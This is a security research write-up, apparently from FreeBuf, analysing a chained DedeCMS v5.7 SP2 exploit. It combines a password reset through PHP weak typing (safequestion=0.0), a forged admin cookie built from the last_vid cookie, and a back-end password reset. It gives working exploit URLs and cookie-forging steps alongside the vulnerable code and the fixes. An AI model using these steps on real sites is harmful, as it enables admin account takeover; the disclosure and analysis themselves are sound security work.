***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

##  **0x00 概述  
**

 **2018年1月，网上爆出dedecms v5.7
sp2的前台任意用户密码重置和前台任意用户登录漏洞，加上一个管理员前台可修改其后台密码的安全问题，形成漏洞利用链，这招组合拳可以重置管理员后台密码。**

 **先来看看整体利用流程：**

> **重置admin前台密码--- >用admin登录前台--->重置admin前后台密码**

##  **0x01 前台任意用户密码重置分析** ****

###  **组合拳第一式：重置管理员前台密码** ****

漏洞文件：member\resetpassword.php：75

    
    
    else if($dopost == "safequestion")      
    {      
        $mid = preg_replace("#[^0-9]#", "", $id);      
        $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";      
        $row = $db->GetOne($sql);      
        if(empty($safequestion)) $safequestion = '';      
      
        if(empty($safeanswer)) $safeanswer = '';      
      
        if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)      
        {      
            sn($mid, $row['userid'], $row['email'], 'N');      
            exit();      
        }      
        else      
        {      
            ShowMsg("对不起，您的安全问题或答案回答错误","-1");      
            exit();      
        }      
      
    }

可以看到要进入sn函数，必须满足

> ($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)

通过查询数据库可知

![dedecmsv57sp200.png](https://image.3001.net/images/20180224/15194764641518.png!small)

> row['safeanswer']=空,$row['safequestion']=0

所以传入的payload中$safeanswer为空符合条件，而如果$safequestion传入0，则遇到

> if(empty($safequestion)) $safequestion = '';

就置空了，继而空和0不等无法进入sn函数。

所以这里可以运用php的弱类型问题，参考[www.lsablog.com/network_security/ctf/hackinglab-cn-series-decryption-can-md5-be-bumped/](http://www.lsablog.com/network_security/ctf/hackinglab-cn-series-decryption-can-md5-be-bumped/)

将$safequestion传入0.0即可绕过判断

![dedecmsv57sp201.png](https://image.3001.net/images/20180224/15194767183485.png!small)

继续跟进sn函数

\member\inc\inc_pwd_functions.php：150

先看看dede_pwd_tmp表

![dedecmsv57sp202.png](https://image.3001.net/images/20180224/15194768331940.png!small)

为空

所以执行

    
    
      newmail($mid,$userid,$mailto,'INSERT',$send);

继续跟进newmail函数，在73行

关键代码：

    
    
    function sn($mid,$userid,$mailto, $send = 'Y')
    {
        global $db;
        $tptim= (60*10);
        $dtime = time();
        $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'";
        $row = $db->GetOne($sql);
        if(!is_array($row))
        {
            //发送新邮件；
            newmail($mid,$userid,$mailto,'INSERT',$send);
        }
        //10分钟后可以再次发送新验证码；
        elseif($dtime - $tptim > $row['mailtime'])
        {
            newmail($mid,$userid,$mailto,'UPDATE',$send);
        }
        //重新发送新的验证码确认邮件；
        else
        {
            return ShowMsg('对不起，请10分钟后再重新申请', 'login.php');
        }
    }
    function newmail($mid, $userid, $mailto, $type, $send)
    {
        global $db,$cfg_adminemail,$cfg_webname,$cfg_basehost,$cfg_memberurl;
        $mailtime = time();
        $randval = random(8);
        $mailtitle = $cfg_webname.":密码修改";
        $mailto = $mailto;
        $headers = "From: ".$cfg_adminemail."\r\nReply-To: $cfg_adminemail";

$mailbody =
"亲爱的".$userid."：\r\n您好！感谢您使用".$cfg_webname."网。\r\n".$cfg_webname."应您的要求，重新设置密码：（注：如果您没有提出申请，请检查您的信息是否泄漏。）\r\n本次临时登陆密码为：".$randval."
请于三天内登陆下面网址确认修改。\r\n".$cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&id=".$mid;

    
    
     if($type == 'INSERT')
    
        {
    
            $key = md5($randval);
    
            $sql = "INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid',  '$key', '$mailtime');";
    
            if($db->ExecuteNoneQuery($sql))
    
            {
    
                if($send == 'Y')
    
                {
    
                    sendmail($mailto,$mailtitle,$mailbody,$headers);
    
                    return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000');
    
                } else if ($send == 'N')
    
                {
    
                    return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&ampampid=".$mid."&ampampkey=".$randval);
    
                }
    
            }

可以看出生成了8位随机码key以md5加密放入dede_pwd_tmp表中，再跳转到url

>
> $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&ampampid=".$mid."&ampampkey=".$randval

即

>
> [http://127.0.0.1:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/resetpassword.php?dopost=getpasswd&id=2&key=gnUckBp3](http://127.0.0.1:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/resetpassword.php?dopost=getpasswd&id=2&key=gnUckBp3)

mid可控,key也知道了，就可以重置任意mid用户密码了，继续跟进dopost=getpasswd这段代码，在

member\resetpassword.php：96

关键代码

    
    
    elseif($setp == 2)
        {
            if(isset($key)) $pwdtmp = $key;
            $sn = md5(trim($pwdtmp));
            if($row['pwd'] == $sn)
            {
                if($pwd != "")
                {
                    if($pwd == $pwdok)
                    {
                        $pwdok = md5($pwdok);
                        $sql = "DELETE FROM `#@__pwd_tmp` WHERE `mid` = '$id';";
                        $db->executenonequery($sql);
                        $sql = "UPDATE `#@__member` SET `pwd` = '$pwdok' WHERE `mid` = '$id';";
                        if($db->executenonequery($sql))
                        {
                            showmsg('更改密码成功，请牢记新密码', 'login.php');
                            exit;
                        }
                    }
                }

判断key的md5是否和dede_pwd_tmp的pwd相同，是则更新用户密码，完成任意用户密码重置。

 **第一式第一步：访问链接：**

>
> [_http://192.168.43.173:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/resetpassword.php?dopost=safequestion
> &safequestion=0.0&safeanwser=&id=1_](http://192.168.110.10:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/resetpassword.php?dopost=safequestion&safequestion=0.0&safeanwser=&id=1)

![dedecmsv57sp225.png](https://image.3001.net/images/20180224/15194773996477.png!small)  

![dedecmsv57sp223.png](https://image.3001.net/images/20180224/15194774239593.png!small)

**第一式第二步：再访问：** ****

>
> [_http://127.0.0.1:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/resetpassword.php?dopost=getpasswd
> &id=1&key=gnUckBp3_](http://127.0.0.1:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/resetpassword.php?dopost=getpasswd&id=1&key=gnUckBp3)

![dedecmsv57sp224.png](https://image.3001.net/images/20180224/1519477477482.png!small)  

重置管理员前台密码为pass000

##  **0x02 前台任意用户登录分析** ****

 **组合拳第二式：管理员登录前台** ****

判断用户登录的函数在

include\memberlogin.class.php：292

    
    
     function IsLogin()
        {
            if($this->M_ID > 0) return TRUE;
            else return FALSE;
    }

再到138行

    
    
    class MemberLogin
    {
        var $M_ID;
        var $M_LoginID;
        var $M_MbType;
        var $M_Money;
        var $M_Scores;
        var $M_UserName;
        var $M_Rank;
         var $M_Face;
        var $M_LoginTime;
        var $M_KeepTime;
        var $M_Spacesta;
        var $fields;
        var $isAdmin;
        var $M_UpTime;
        var $M_ExpTime;
        var $M_HasDay;
        var $M_JoinTime;
        var $M_Honor = '';
        var $memberCache='memberlogin';
     
        //php5构造函数
        function __construct($kptime = -1, $cache=FALSE)
        {
            global $dsql;
            if($kptime==-1){
                $this->M_KeepTime = 3600 * 24 * 7;
            }else{
                $this->M_KeepTime = $kptime;
            }
            $formcache = FALSE;
            $this->M_ID = $this->GetNum(GetCookie("DedeUserID"));
            $this->M_LoginTime = GetCookie("DedeLoginTime");
            $this->fields = array();
            $this->isAdmin = FALSE;
            if(empty($this->M_ID))
            {
                $this->ResetUser();
            }else{
                $this->M_ID = intval($this->M_ID);
                
                if ($cache)
                {
                    $this->fields = GetCache($this->memberCache, $this->M_ID);
                    if( empty($this->fields) )
                    {
                        $this->fields = $dsql->GetOne("Select * From `#@__member` where mid='{$this->M_ID}' ");
                    } else {
                        $formcache = TRUE;
                    }
                } else {
                    $this->fields = $dsql->GetOne("Select * From `#@__member` where mid='{$this->M_ID}' ");
                }

可以看到  

    
    
    $this->M_ID = $this->GetNum(GetCookie("DedeUserID"));

在看看GetNum函数，在398行

    
    
     function GetNum($fnum){
            $fnum = preg_replace("/[^0-9\.]/", '', $fnum);
            return $fnum;
    }

替换非数字字符为空。

还有

    
    
    $this->M_ID = intval($this->M_ID);

整体来说就是从cookie中获取DedeUserID的值，去除非数字字符，再经过整形转化，形成mid，再进入数据库查询。

继续跟进GetCookie函数，

include\helpers\cookie.helper.php：54

    
    
    if ( ! function_exists('GetCookie'))
    {
        function GetCookie($key)
        {
            global $cfg_cookie_encode;
            if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) )
            {
                return '';
            }
            else
            {
                if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
                {
                    return '';
                }
                else
                {
                    return $_COOKIE[$key];
                }
            }
        }
    }

关键一行

    
    
    if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))

这个$cfg_cookie_encode是未知的，需要任意文件读取或下载才能获得，这形似加salt的方式保证了cookie只能服务端生成，防止客户端伪造，这里需要
**DedeUserID__ckMd5的值 == ($cfg_cookie_encode.$_COOKIE[DedeUserID])的md5的前16位**
才能通过验证。

至此，进入下一阶段，看看DedeUserID_ckMd5和DedeUserID的来源，他们在登录后产生，来看看登录代码，

include\memberlogin.class.php：469  

    
    
    function CheckUser(&$loginuser, $loginpwd)
        {
            global $dsql;
            //检测用户名的合法性
            $rs = CheckUserID($loginuser,'用户名',FALSE);
            //用户名不正确时返回验证错误，原登录名通过引用返回错误提示信息
            if($rs!='ok')
            {
                $loginuser = $rs;
                return '0';
            }
            //matt=10 是管理员关连的前台帐号，为了安全起见，这个帐号只能从后台登录，不能直接从前台登录
            $row = $dsql->GetOne("SELECT mid,matt,pwd,logintime FROM `#@__member` WHERE userid LIKE '$loginuser' ");
            if(is_array($row))
            {
                if($this->GetShortPwd($row['pwd']) != $this->GetEncodePwd($loginpwd))
                {
                    return -1;
                }
                else
                {
                    //管理员帐号不允许从前台登录
                    if($row['matt']==10) {
                        return -2;
                    }
                    else {
                        $this->PutLoginInfo($row['mid'], $row['logintime']);
                        return 1;
                    }
                }
            }
            else
            {
                return 0;
            }
        }
        /**
         *  保存用户cookie
         *
         * @access    public
         * @param     string  $uid  用户ID
         * @param     string  $logintime  登录限制时间
         * @return    void
         */
        function PutLoginInfo($uid, $logintime=0)
        {
            global $cfg_login_adds, $dsql;
            //登录增加积分(上一次登录时间必须大于两小时)
            if(time() - $logintime > 7200 && $cfg_login_adds > 0)
            {
                $dsql->ExecuteNoneQuery("Update `#@__member` set `scores`=`scores`+{$cfg_login_adds} where mid='$uid' ");
            }
            $this->M_ID = $uid;
            $this->M_LoginTime = time();
            $loginip = GetIP();
            $inquery = "UPDATE `#@__member` SET loginip='$loginip',logintime='".$this->M_LoginTime."' WHERE mid='".$uid."'";
            $dsql->ExecuteNoneQuery($inquery);
            if($this->M_KeepTime > 0)
            {
                PutCookie('DedeUserID',$uid,$this->M_KeepTime);
                PutCookie('DedeLoginTime',$this->M_LoginTime,$this->M_KeepTime);
            }
            else
            {
                PutCookie('DedeUserID',$uid);
                PutCookie('DedeLoginTime',$this->M_LoginTime);
            }
        }

可以看到登录验证成功就

    
    
    PutCookie('DedeUserID',$uid,$this->M_KeepTime);

而这个$uid是mid(不是用户名)，

自然要来看看PutCookie方法了，

跟进PutCookie方法，

include\helpers\cookie.helper.php：21

    
    
    if ( ! function_exists('PutCookie'))
    {
        function PutCookie($key, $value, $kptime=0, $pa="/")
        {
            global $cfg_cookie_encode,$cfg_domain_cookie;
            setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie);
            setcookie($key.'__ckMd5', substr(md5($cfg_cookie_encode.$value),0,16), time()+$kptime, $pa,$cfg_domain_cookie);
        }
    }

关键是这两行

    
    
    setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie);
    setcookie($key.'__ckMd5', substr(md5($cfg_cookie_encode.$value),0,16), 

这里就设置了DedeUserID和DedeUserID_ckMd5。

现在再进入下一个阶段，若需要伪造cookie使管理员登录前台，必须满足

 **DedeUserID__ckMd5的值 == ($cfg_cookie_encode.$_COOKIE[DedeUserID])的md5的前16位**
****

而管理员的DedeUserID已知为1，$cfg_cookie_encode无法得到，所以关键在于找到满足这个条件的
**DedeUserID__ckMd5** 密文。 ****

那就搜索PutCookie看看哪个键会满足这个条件，

![dedecmsv57sp221.png](https://image.3001.net/images/20180224/15194780501617.png!small)  

来到member/index.php:139

关键代码：

    
    
     if($vtime - $last_vtime > 3600 || !preg_match('#,'.$uid.',#i', ','.$last_vid.',') )
            {
                if($last_vid!='')
                {
                    $last_vids = explode(',',$last_vid);
                    $i = 0;
                    $last_vid = $uid;
                    foreach($last_vids as $lsid)
                    {
                        if($i>10)
                        {
                            break;
                        }
                        else if($lsid != $uid)
                        {
                            $i++;
                            $last_vid .= ','.$last_vid;
                        }
                    }
                }
                else
                {
                    $last_vid = $uid;
                }
                PutCookie('last_vtime', $vtime, 3600*24, '/');
                PutCookie('last_vid', $last_vid, 3600*24, '/');

可以看出$last_vid为空则把$uid赋值给$last_vid，而这个$uid就是可控的用户名，再

    
    
    PutCookie('last_vid', $last_vid, 3600*24, '/');

这里假如构造出类似0000001或1abcde这样的用户名，因为 **last_vid__ckMd5的值 ==
($cfg_cookie_encode.$_COOKIE[last_vid])的md5的前16位,满足条件！**  

    
    
    mid=return $_COOKIE[$key];

接着在登录类的构造函数中mid经过GetNum和intval函数的过滤，就形成了1，接着进入数据库查询再展示到页面。

###  **漏洞触发流程：** ****

 **第一阶段：** ****

 **访问member/index.php?uid=0000001产生last_vid和last_vid__ckMd5** ****

 **第二阶段：** ****

 **登录成功--->PutCookie(设置$key和$key.'__ckMd5')--->产生DedeUserID(uid)和DedeUserID__ckMd5--->修改DedeUserID(uid)和DedeUserID__ckMd5分别为last_vid和last_vid__ckMd5--->满足GetCookie的验证条件**
****

 **第三阶段：** ****

 **IsLogin(M_ID)--->__construct(GetCookie("DedeUserID"))--->GetCookie(验证DedeUserID__ckMd5值是否等于substr(md5($cfg_cookie_encode.$_COOKIE[DedeUserID]),0,16))**
****

 **\--->满足条件--->返回0000001给mid--->GetNum和intval函数过滤--->mid=1--->入库查询--->管理员登录前台** **  
**

###  **组合拳第二式：** ****

需要先将用户0000001通过审核，再访问

[
_http://127.0.0.1:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/index.php?uid=0000001_](http://127.0.0.1:8999/lsawebtest/vulnenvs/dedecms/dedecms-v57-utf8-sp2-full/member/index.php?uid=000001)

![dedecmsv57sp214.png](https://image.3001.net/images/20180224/1519478341736.png!small)  

获取cookie中last_vid_ckMd5值48741df1f12d04bd

再登录0000001帐号

然后设置DeDeUserID_ckMd5为last_vid_ckMd5的值，并设置DedeUserID为0000001。

![dedecmsv57sp215.png](https://image.3001.net/images/20180224/15194784797810.png!small)  

刷新页面，成功以管理员登录前台

![dedecmsv57sp218.png](https://image.3001.net/images/20180224/15194785289096.png!small)

  

## **0x03 重置管理员前后台密码** ****

###  **组合拳第三式：重置管理员后台密码** ****

看看出问题的文件

member\edit_baseinfo.php：115

关键代码：

    
    
    $query1 = "UPDATE `#@__member` SET pwd='$pwd',sex='$sex'{$addupquery} where mid='".$cfg_ml->M_ID."' ";
    $dsql->ExecuteNoneQuery($query1);

//如果是管理员，修改其后台密码

    
    
        if($cfg_ml->fields['matt']==10 && $pwd2!="")
        {
            $query2 = "UPDATE `#@__admin` SET pwd='$pwd2' where id='".$cfg_ml->M_ID."' ";
            $dsql->ExecuteNoneQuery($query2);
    }

这里旧密码是和member表的pwd比对，已经被利用漏洞前台重置，可以重置密码，由于是管理员，所以前台和后台密码都重置了。

###  **组合拳第三式：**

原登录密码就是刚刚重置的前台密码pass000，修改新密码为010101，成功登录管理后台！

![dedecmsv57sp219.png](https://image.3001.net/images/20180224/15194786715157.png!small)

![dedecmsv57sp220.png](https://image.3001.net/images/20180224/15194787068651.png!small)  

  

## **0x0** **4** **修复方案** ****

1.关闭会员功能。

2.若不影响业务，可以尝试注释下面代码

member/index.php:163～164

    
    
    PutCookie('last_vtime', $vtime, 3600*24, '/');
    PutCookie('last_vid', $last_vid, 3600*24, '/');

3.将管理员后台地址改复杂。

4.关注官方更新。

##  **0x0** **5** **结语** ****

又是一次组合攻击，再一次证明，单一漏洞危害可能有限，但是多个漏洞组合起来威力将大大增强！所以不要轻视任何一个微小漏洞，也不要放过任何一个可能存在漏洞的地方。

##  **0x0** **6** **参考资料** ****

[
_https://xianzhi.aliyun.com/forum/topic/1961_](https://xianzhi.aliyun.com/forum/topic/1961)

[
_www.freebuf.com/column/161703.html_](http://www.freebuf.com/column/161703.html)

[
_https://xianzhi.aliyun.com/forum/topic/1959_](https://xianzhi.aliyun.com/forum/topic/1959)

[ _https://blog.formsec.cn/2018/01/11/DedeCMS-password-reset/_](https://blog.formsec.cn/2018/01/11/DedeCMS-password-reset/)

 _<https://lorexxar.cn/2018/01/19/dedecms-vul1/>_

 ***本文作者：LSA，转载请注明来自FreeBuf.COM**  

